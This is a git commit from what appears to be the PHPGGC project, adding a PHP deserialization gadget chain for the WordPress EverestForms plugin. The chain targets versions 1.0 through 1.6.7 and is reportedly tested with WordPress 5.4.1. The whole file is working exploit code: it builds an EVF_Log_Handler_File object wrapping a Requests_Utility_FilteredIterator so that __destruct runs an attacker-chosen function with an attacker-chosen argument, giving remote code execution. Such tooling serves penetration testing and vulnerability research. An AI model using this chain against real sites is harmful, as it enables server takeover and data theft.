3ca2262d5027ba68b913be609393e3fb45085632
erwanlr <erwan.lr@gmail.com>
2020-05-20 07:59:35 +0200

    Adds WP EverestForms Plugin GadgetChain

---
+++ gadgetchains/WordPress/P/EverestForms/RCE/1/chain.php
@@ -0,0 +1,20 @@
+<?php
+
+namespace GadgetChain\WordPress\P\EverestForms;
+
+class RCE1 extends \PHPGGC\GadgetChain\RCE
+{
+    public static $version = '1.0 <= 1.6.7+';
+    public static $vector = '__destruct';
+    public static $author = 'erwan_lr';
+    public static $informations = 'Tested up to WP 5.4.1 and EverestForms 1.6.7. Newest versions might also work.
+    ';
+
+    public function generate(array $parameters)
+    {
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
+
+        return new \EVF_Log_Handler_File(new \Requests_Utility_FilteredIterator([$parameter], $function));
+    }
+}
